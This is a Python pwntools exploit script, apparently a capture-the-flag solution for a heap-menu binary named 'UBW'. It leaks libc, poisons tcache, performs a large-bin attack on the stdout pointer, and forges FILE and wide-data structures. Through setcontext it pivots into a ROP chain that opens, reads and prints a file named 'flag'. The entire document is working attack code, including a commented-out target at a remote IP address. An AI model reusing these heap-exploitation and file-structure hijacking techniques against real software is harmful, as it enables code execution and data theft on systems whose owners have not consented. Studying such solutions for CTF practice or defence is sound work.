#!/usr/bin/env python3
import re, time, warnings
warnings.filterwarnings("ignore", category=BytesWarning)
from pwn import *

context.log_level = "error"
context.timeout = 3
context.arch = "amd64"

main_arena = 0x203b20
stdout_ptr = 0x2046a8
wfile = 0x202228
setcontext = 0x4a960
lock = 0x205700

pop_rdi = 0x10f78b
pop_rsi = 0x110bac
pop_rdx = 0x0b505c
open_ = 0x11b150
read = 0x11ba80
write = 0x11c590
pop_rsp = 0x03c068
add_rsp_38 = 0x12dfba

def bad(x):
    assert b"\n" not in x and b"\a" not in x
    return x

def safe6(x):
    assert b"\0" not in x[:6] and b"\n" not in x[:6]
    return x[:6]

def fit(sz):
    return max((sz + 1 + 8 + 15) & ~15, 0x20)

def req(nb):
    return next(i for i in range(nb - 0x18, nb) if i > 0 and fit(i) == nb)

def leak_libc(prefix, around):
    ans = []
    lo = (around - 0x8000000) & ~0xfff
    hi = (around + 0x8000000 + 0xfff) & ~0xfff
    for base in range(lo, hi, 0x1000):
        raw = p64(base + main_arena)
        if raw[:len(prefix)] == prefix and (len(prefix) >= 6 or raw[len(prefix)] == 0):
            ans.append(base)
    assert len(ans) == 1
    return ans[0]

def rop(libc, p):
    path, buf = p + 0x180, p + 0x1a0
    q = lambda x: libc + x
    chain = [
        q(pop_rdi), path, q(pop_rsi), 0, q(pop_rdx), 0, 0, 0, 0, 0, q(open_),
        q(pop_rdi), 3, q(pop_rsi), buf, q(pop_rdx), 0x100, 0, 0, 0, 0, q(read),
        q(pop_rdi), 1, q(pop_rsi), buf, q(pop_rdx), 0x100, 0, 0, 0, 0, q(write),
    ]
    return bad(flat(chain).ljust(0x180, b"\0") + b"flag\0".ljust(0x20, b"\0"))

def wide(libc, p, stack):
    x = bytearray(0x220)
    x[0x38:0x40] = p64(libc + pop_rsp)
    x[0x40:0x48] = p64(stack)
    x[0xe0:0xe8] = p64(p + 0x100)
    x[0x168:0x170] = p64(libc + setcontext)
    return bad(bytes(x))

def fake_file(libc, p, widep):
    fake = p - 0x10
    x = bytearray(0x438)
    def put(off, val):
        x[off - 0x10:off - 8] = p64(val)
    put(0x20, 0)
    put(0x28, 1)
    put(0x88, libc + lock)
    put(0xa0, widep)
    put(0xa8, libc + add_rsp_38)
    put(0xd8, libc + wfile)
    put(0xe0, fake + 0x300)
    x[0x1b0:0x1b4] = p32(0x1f80)
    return bad(bytes(x))

for _ in range(120):
    io = process("./UBW")
    # io = remote("1.95.8.104", 5000)
    try:
        def add(i, n, data=b""):
            io.sendlineafter(b"UBW> ", b"1")
            io.sendlineafter(b"sigil: ", str(i).encode())
            io.sendlineafter(b"ore: ", str(n).encode())
            io.recvuntil(b"blade: ")
            p = int(io.recvline(), 16)
            if callable(data):
                data = data(p)
            io.sendlineafter(b"chant: ", bad(data))
            return p

        def free(i):
            io.sendlineafter(b"UBW> ", b"2")
            io.sendlineafter(b"sigil: ", str(i).encode())

        def merge(a, b):
            io.sendlineafter(b"UBW> ", b"4")
            io.sendlineafter(b"dst: ", str(a).encode())
            io.sendlineafter(b"src: ", str(b).encode())
            io.recvuntil(b"Tempered: ")
            return io.recvuntil(b"UBW> ", drop=True)

        mmap = add(31, 0x3ffff, b"M")

        probe = add(28, 0x10, b"R")
        top = probe + fit(0x10)
        for nb in range(0x20, 0x40000, 0x10):
            if (((top + nb) >> 12) & 0xf) == 0:
                add(29, req(nb), b"P")
                break

        p0 = add(0, 0xe7, b"A" * 0xe0)
        for i in range(7): add(i + 1, 0xe7, b"B" * 0xe7)
        for i in range(7): free(i + 1)
        free(0)

        add(0, 0x97, b"A" * 0x97)
        for i in range(7): add(i + 1, 0x97, b"C" * 0x97)
        for i in range(7): free(i + 1)
        add(10, 0xe7, b"D" * 0xe7)

        out = merge(0, 0)
        mark = out.index(b"A" * 0x97) + 0x97
        leak = out[mark:out.find(b"\n[1]", mark)]
        libc = leak_libc(leak, mmap)

        add(0, 0xe1, p64(libc + main_arena) * 2 + b"A" * 0xd0 + b"\xf0")
        for i in range(2, 8): add(i, 0xe1, b"Q" * 0xe1)
        assert add(1, 0xe7, b"R" * 0xe7) == p0

        qidx = None
        for i in list(range(8, 28)) + [30]:
            if i in (10, 28, 29, 31):
                continue
            if (add(i, 0xe7, b"S" * 0xe7) & 0xff) == ((p0 >> 12) & 0xff):
                qidx = i
                break
        assert qidx is not None

        used = {0, 1, qidx, 28, 29, 31}
        sr, sw, la, ga, lb, gb, tmp, trig, src, pa, pb = [i for i in range(8, 31) if i not in used][:11]

        chain = add(sr, 0x300, lambda p: rop(libc, p))
        widep = add(sw, 0x220, lambda p: wide(libc, p, chain))
        a = add(la, 0x448, b"A" * 0x448)
        add(ga, 0x20, b"ga")
        add(lb, 0x438, lambda p: fake_file(libc, p, widep))
        add(gb, 0x20, b"gb")

        add(src, 0x30, safe6(p64((a + 0x10) ^ (p0 >> 12))) + b"\0")

        free(la)
        add(tmp, 0x500, b"T")

        free(qidx)
        free(0)
        merge(1, src)
        add(pa, 0xe7, b"U" * 0xe7)
        assert add(pb, 0xe7, p64(a - 0x10) + p64(libc + stdout_ptr - 0x20)) == a + 0x10

        free(lb)
        io.sendlineafter(b"UBW> ", b"1")
        io.sendlineafter(b"sigil: ", str(trig).encode())
        io.sendlineafter(b"ore: ", b"1280")

        data = io.recvall(timeout=3).replace(b"\0", b"")
        m = re.search(rb"[A-Za-z0-9_]+\{[^}\n]+\}", data)
        if m:
            print(m.group(0).decode())
            break
        if data and b"malloc" not in data.lower() and b"corruption" not in data.lower():
            print(data.decode("latin1", "replace"))
            break
    except Exception:
        pass
    finally:
        io.close()
    time.sleep(0.05)